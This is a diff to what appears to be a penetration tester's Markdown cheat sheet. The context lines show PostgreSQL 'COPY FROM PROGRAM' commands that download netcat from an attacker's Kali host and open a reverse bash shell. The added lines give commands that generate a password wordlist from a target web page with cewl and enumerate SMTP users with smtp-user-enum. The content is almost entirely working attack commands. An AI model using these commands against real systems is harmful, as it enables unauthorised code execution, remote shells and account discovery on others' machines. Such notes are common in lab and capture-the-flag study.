@@ -192,3 +192,14 @@ postgres=# COPY cmd_exec FROM PROGRAM 'wget http://Kali IP/nc';
 postgres=# DELETE FROM cmd_exec;
 postgres=# COPY cmd_exec FROM PROGRAM 'nc -n <kali IP> 5437 -e /usr/bin/bash';
 ```
+---
+# cewl(Custom Word List generator)
+```bash
+cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
+```
+---
+# SMTP User Enum
+```bash
+perl smtp-user-enum.pl -M VRFY -U /home/kali/Desktop/known-users -t 192.168.211.137
+```
+---
